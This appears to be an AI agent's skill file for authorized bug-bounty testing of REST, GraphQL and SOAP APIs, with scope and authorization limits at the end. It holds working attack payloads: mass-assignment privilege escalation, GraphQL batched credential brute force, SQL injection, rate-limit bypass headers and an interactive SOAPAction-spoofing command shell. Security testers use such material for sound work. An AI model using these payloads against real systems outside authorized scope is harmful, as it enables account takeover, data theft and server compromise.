---
name: api-attacks
description: API security testing — REST (excessive data exposure, mass assignment, IDOR), GraphQL (introspection, batching abuse, field suggestion, mutation IDOR), SOAP/WSDL (enumeration, SOAPAction spoofing), API versioning (v1 regression), API key leakage in JS, Swagger/OpenAPI docs exposure. Use when HauntMode identifies API endpoints, when the target uses JSON/REST/GraphQL/SOAP interfaces, or when testing web services.
---

# API Attacks — REST, GraphQL, SOAP/WSDL, Versioning, Key Leakage

Grounded in the CBBH Web Service & API Attacks module. Read top-to-bottom on first invocation; jump to the relevant section on repeat runs.

---

## 1. Triggers — when this skill applies

- Requests going to `/api/`, `/v1/`, `/v2/`, `/graphql`, `/wsdl`, `/soap`, `/rest/`, `/json-rpc/`
- Responses containing JSON arrays or objects with more fields than the UI displays
- `Content-Type: application/json` or `application/xml` on POST bodies
- `SOAPAction` header present in requests
- JS source files referencing API endpoints or containing API keys
- Swagger UI, `/api-docs`, `/swagger.json`, `/openapi.json`, `/redoc` accessible
- GraphQL endpoint (`/graphql`, `/gql`, `/query`) responding to introspection queries

---

---

## 3. 30-second triage

1. What API style is in use? Check URLs, `Content-Type`, `SOAPAction` header, query structure.
2. Is Swagger/OpenAPI docs exposed? Try `/api-docs`, `/swagger.json`, `/openapi.json`, `/swagger-ui.html`.
3. Does a GET response return more fields than the POST that creates the resource? (Excessive data exposure)
4. Can you send fields in POST/PUT that aren't in the documented schema? (Mass assignment)
5. Is there an `/api/v1/` alongside `/api/v2/`? (Versioning regression)
6. Does WSDL expose a dangerous operation like `ExecuteCommand`? (SOAPAction spoofing candidate)

---

## 4. REST API attacks

### 4.1 Excessive data exposure

A GET endpoint returns more fields than the client actually uses. The API trusts the client to filter.

Detection: Compare the JSON response of a GET request to the fields you submitted in the POST that created the resource. Extra fields = excessive data exposure.

```bash
# Get your own user record
curl -s -H "Authorization: Bearer TOKEN" https://api.target.com/v1/users/me | jq .
```

Look for: `password_hash`, `api_key`, `internal_id`, `admin`, `role`, `ssn`, `dob`, `email` (when it shouldn't be exposed), `credit_card_last4`, any field that shouldn't be publicly visible.

### 4.2 Mass assignment

The API auto-binds all request body fields to the underlying object without a whitelist. You can set fields you shouldn't be allowed to set.

Detection: Take a normal POST/PUT body, add extra fields, and see if they're accepted and persisted.

```bash
# Normal registration
POST /api/v1/users
{"username":"test","password":"test123"}

# Mass assignment attempt — add privileged fields
POST /api/v1/users
{"username":"test","password":"test123","admin":true,"role":"admin","isAdmin":1,"verified":true}
```

Then GET your user record and check if the extra fields were applied. Also try:
```json
{"username":"test","password":"test123","balance":9999999,"credit":100000}
```

### 4.3 IDOR via object ID

Standard IDOR — change the ID in the path or body to another user's ID.

```bash
# Your resource
GET /api/v1/orders/1042

# Another user's resource
GET /api/v1/orders/1041
GET /api/v1/orders/1043
```

If the API returns another user's data without authorization check, IDOR is confirmed. For sequential IDs, enumerate a range. For UUIDs, check if the app leaks valid UUIDs in other responses.

For detailed IDOR methodology, invoke the `idor` skill.

### 4.4 Parameter fuzzing for undocumented parameters

```
[RUN THIS]
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u 'https://api.target.com/api/v1/users?FUZZ=test' \
  -fs 0 -mc 200 -H "Authorization: Bearer TOKEN"
```

Also fuzz the path for undocumented endpoints:
```
[RUN THIS]
ffuf -w /usr/share/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt \
  -u 'https://api.target.com/api/v1/FUZZ' \
  -mc 200,201,301,302 -H "Authorization: Bearer TOKEN"
```

### 4.5 API key leakage in JS files

Look in JS source files for hardcoded secrets:

```bash
# In Burp: look at JS files loaded by the application
# Manually: grep JS sources for key patterns
curl -s https://target.com/static/app.js | grep -iE '(api_key|apikey|secret|token|bearer|auth)["\s]*[:=]["\s]*[A-Za-z0-9]{16,}'
```

Common patterns to search for: `apiKey`, `api_key`, `access_token`, `secret_key`, `private_key`, `AWS_ACCESS`, `STRIPE_`, `TWILIO_`, `SENDGRID_`.

---

## 5. GraphQL attacks

### 5.1 Introspection — map the full schema

If introspection is enabled, you can enumerate every type, field, and mutation without any documentation.

```bash
# Basic introspection query
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}' | jq .
```

Full introspection (copy the whole schema):
```json
{
  "query": "{ __schema { queryType { name } mutationType { name } types { name kind fields { name args { name type { name kind ofType { name kind } } } type { name kind ofType { name kind } } } } } }"
}
```

### 5.2 Field suggestion enumeration

Even when introspection is disabled, GraphQL often returns "Did you mean X?" suggestions for typos. Use this to enumerate valid field names:

```json
{"query": "{ usr { id } }"}
```

Response: `"Did you mean \"user\"?"` — confirms `user` is a valid type.

Try variations of likely field names: `usr`, `users`, `admin`, `me`, `account`, `viewer`, `currentUser`.

### 5.3 Batching abuse for rate limit bypass

GraphQL allows sending multiple queries in one request. If rate limiting is per-request (not per-operation), you can brute-force thousands of values in a single HTTP request.

```json
[
  {"query": "mutation { login(username: \"admin\", password: \"password1\") { token } }"},
  {"query": "mutation { login(username: \"admin\", password: \"password2\") { token } }"},
  {"query": "mutation { login(username: \"admin\", password: \"password3\") { token } }"}
]
```

Use this for credential brute force, OTP guessing, or any rate-limited operation.

### 5.4 Mutation IDOR

Test mutations with other users' IDs:

```json
{"query": "mutation { updateUser(id: 2, email: \"attacker@evil.com\") { id email } }"}
```

If you're user ID 5 and this modifies user ID 2's email, that's an IDOR.

### 5.5 GraphQL endpoint discovery

Common paths: `/graphql`, `/gql`, `/query`, `/api/graphql`, `/graphiql`, `/graphql/console`

```
[RUN THIS]
ffuf -w /usr/share/seclists/Discovery/Web-Content/graphql.txt \
  -u https://target.com/FUZZ -mc 200,400
```

---

## 6. SOAP/WSDL attacks

### 6.1 WSDL discovery

WSDL describes all available operations and their parameters. Find it first:

```bash
# Common WSDL locations
curl https://target.com/wsdl?wsdl
curl https://target.com/service.wsdl
curl https://target.com/api.wsdl
curl https://target.com/?disco
```

If the WSDL endpoint returns empty:
```
[RUN THIS]
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u 'https://target.com/wsdl?FUZZ' -fs 0 -mc 200
```

Parse the WSDL — look for dangerous `soapAction` operations like `ExecuteCommand`, `RunScript`, `InvokeMethod`, `GetFile`, `ReadFile`.

### 6.2 SOAPAction spoofing

If the server uses `SOAPAction` header to determine what operation to run (instead of the XML body), you can spoof a restricted operation by:
- Putting an **allowed** operation name in the XML body (`<LoginRequest>`)
- Putting the **restricted** operation name in the `SOAPAction` header

```python
import requests

# SOAPAction spoofing: body says "Login", header says "ExecuteCommand"
payload = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:tns="http://tempuri.org/">
  <soap:Body>
    <LoginRequest xmlns="http://tempuri.org/">
      <cmd>id</cmd>
    </LoginRequest>
  </soap:Body>
</soap:Envelope>'''

r = requests.post(
    "https://target.com/wsdl",
    data=payload,
    headers={"SOAPAction": '"ExecuteCommand"',
             "Content-Type": "text/xml"}
)
print(r.content)
```

Interactive shell version (save as `soap_shell.py`):
```python
import requests

while True:
    cmd = input("$ ")
    payload = f'''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:tns="http://tempuri.org/">
  <soap:Body>
    <LoginRequest xmlns="http://tempuri.org/">
      <cmd>{cmd}</cmd>
    </LoginRequest>
  </soap:Body>
</soap:Envelope>'''
    r = requests.post("https://target.com/wsdl", data=payload,
                      headers={"SOAPAction": '"ExecuteCommand"',
                               "Content-Type": "text/xml"})
    print(r.content.decode())
```

### 6.3 SOAP SQLi

If a SOAP operation includes user input in a SQL query, standard SQLi applies via the XML parameter:

```xml
<LoginRequest xmlns="http://tempuri.org/">
  <username>' UNION SELECT id, name, email, username, password FROM users WHERE username='admin' --</username>
  <password>anything</password>
</LoginRequest>
```

---

## 7. API versioning — v1 regression

Developers often add security controls to new API versions but forget to deprecate old ones.

```bash
# Test versioned endpoints
curl -s https://api.target.com/v1/users/me
curl -s https://api.target.com/v2/users/me

# Try common version path patterns
/api/v1/, /api/v2/, /api/v3/
/api/1.0/, /api/2.0/
/v1/, /v2/
/api/beta/, /api/internal/, /api/legacy/
```

If `GET /api/v2/users` requires auth but `GET /api/v1/users` doesn't — that's a versioning regression. Same for missing rate limits, missing input validation, or excessive data exposure in older versions.

---

## 8. Swagger/OpenAPI docs exposure

Exposed API docs give you the complete attack surface map for free.

```bash
# Common doc endpoints
curl -s https://target.com/api-docs
curl -s https://target.com/swagger.json
curl -s https://target.com/openapi.json
curl -s https://target.com/swagger-ui.html
curl -s https://target.com/redoc
curl -s https://target.com/api/swagger
curl -s https://target.com/docs
```

If found: import into Burp (Organizer → import OpenAPI) or use a tool to auto-fuzz all documented endpoints. Look specifically for:
- Admin or internal endpoints documented but "not supposed to be public"
- Endpoints with `deprecated: true` — these may lack updated security
- Operations that accept file uploads, execute commands, or access system resources

---

## 9. Bypass techniques

- **Rate limit bypass via IP spoofing headers:** `X-Forwarded-For: 1.2.3.4`, `X-Real-IP: 127.0.0.1`. Some APIs whitelist these.
- **Auth bypass via base64 encoding:** Some APIs expect parameters in base64 — try `echo "http://127.0.0.1/admin" | base64` for SSRF-like values.
- **JSON content-type switch:** Try `Content-Type: text/plain` or `application/x-www-form-urlencoded` when the API expects JSON — some parsers fall through to different handling.
- **HTTP method override:** `X-HTTP-Method-Override: DELETE` or `_method=DELETE` parameter for APIs behind proxies that block DELETE.
- **GraphQL introspection bypass:** If `__schema` is blocked, try `__type(name: "Query")` or aliased introspection queries.

---

## 10. False-positive checks

- **Excessive data exposure but all fields are non-sensitive:** If the extra fields are IDs or public metadata, impact is minimal. Confirm there are no private fields (PII, hashes, keys) before reporting.
- **Mass assignment accepted but not persisted:** Verify the field actually changed by reading it back. Some APIs silently drop unknown fields after accepting them.
- **SOAPAction spoofing but restricted by another mechanism:** IP-based restriction still applies even if spoofing works on header routing. Confirm the command actually executes.
- **Swagger docs visible but authenticated only:** If docs require login and only show your own data/operations, impact is lower than unauthenticated docs exposure.

---

## 11. Chain candidates

| Chain | Other skill | Impact uplift |
|---|---|---|
| Mass assignment → admin escalation | `idor` | Privilege escalation to admin |
| SOAP SOAPAction spoofing → RCE | `cmdi` | Full server compromise |
| GraphQL IDOR → PII dump | `idor` | Data breach |
| API key in JS → authenticated API access | `idor`, `ssrf` | Full API access as legitimate user |
| REST IDOR in v1 (deprecated) | `idor` | Auth bypass on deprecated endpoint |
| SOAP XXE via XML body | `xxe` | File read, SSRF |
| API endpoint → SQLi | `sqli` | DB dump |
| GraphQL batching → OTP brute force | `auth-bypass` | Account takeover |

---

## 12. Reporting template

```
POTENTIAL FINDING: API [Excessive Data Exposure | Mass Assignment | IDOR | SOAPAction Spoofing | GraphQL Introspection | etc.]
Target: <API endpoint URL>
Method/Type: <REST | GraphQL | SOAP | XML-RPC>
Parameter: <field name / operation name>

Evidence:
  <request and response excerpt showing the vuln>
  e.g. "POST body sent admin:true; subsequent GET confirmed admin=true in response"
  or "SOAPAction: ExecuteCommand with LoginRequest body returned command output"

Impact:
  <e.g. "Any authenticated user can escalate to admin via mass assignment on /api/v1/users"
   or "Unauthenticated attacker can execute arbitrary commands via SOAPAction spoofing">

Severity: <Critical | High | Medium | Low>
  Note: Mass assignment → admin = Critical. Excessive data exposure of PII = High.
  API key in public JS = High. Versioning regression = depends on what's accessible.

Chain potential: <link to other vulns>
Next step: <confirm RCE PoC | enumerate other users via IDOR | dump DB via SQLi>
```

---

## 13. Recon tracker vector strings

Only log if the user explicitly authorizes:

- `api:excessive-data:<endpoint>` — response contains more fields than expected
- `api:mass-assignment:<field>` — undocumented field accepted and persisted
- `api:graphql-introspection` — full schema exposed
- `api:graphql-batching` — rate limit bypassable via batched queries
- `api:soap-spoofing:<operation>` — SOAPAction spoofing confirmed
- `api:swagger-exposed` — API docs publicly accessible
- `api:key-in-js:<file>` — API key found in JS source file
- `api:v1-regression:<endpoint>` — deprecated version lacks controls present in v2
- `api:no:<endpoint>` — tested, no notable findings

---

## 14. What NOT to do

- **Do not run sqlmap against SOAP endpoints** without the researcher running it — automated scanning is the researcher's domain per CLAUDE.md.
- **Do not delete or modify other users' data** when testing IDOR via API. Read-only access is sufficient to prove the vuln.
- **Do not dump the full database** via SQLi. Prove the vuln with a single record (e.g., admin username) and stop.
- **Do not exhaust rate limits** when fuzzing API endpoints — re-read `program-guidelines.txt` first.
- **Do not test GraphQL mutations** that make state-changing writes on production without explicit researcher authorization.
- **Do not auto-log to the recon tracker** without explicit user instruction.
- **Do not test out-of-scope API subdomains** — verify `scope.txt`.
